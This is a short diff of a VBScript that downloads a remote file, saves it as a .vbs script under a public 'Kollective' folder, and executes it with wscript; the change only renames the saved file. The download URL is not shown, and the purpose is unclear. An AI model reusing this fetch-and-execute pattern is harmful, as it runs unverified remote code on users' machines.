@@ -7,8 +7,8 @@ xHttp.Send
 bStrm.Type = 1 '//binary
 bStrm.Open
 bStrm.write xHttp.responseBody
-bStrm.savetofile obj.ExpandEnvironmentStrings("%PUBLIC%\Documents\Kollective\msn-article.vbs"), 2 '//overwrite
+bStrm.savetofile obj.ExpandEnvironmentStrings("%PUBLIC%\Documents\Kollective\kollector.vbs"), 2 '//overwrite
 bStrm.Close
  
 Set oShell = WScript.CreateObject("WScript.Shell")
-oShell.run "wscript.exe %PUBLIC%\Documents\Kollective\msn-article.vbs"
+oShell.run "wscript.exe %PUBLIC%\Documents\Kollective\kollector.vbs"
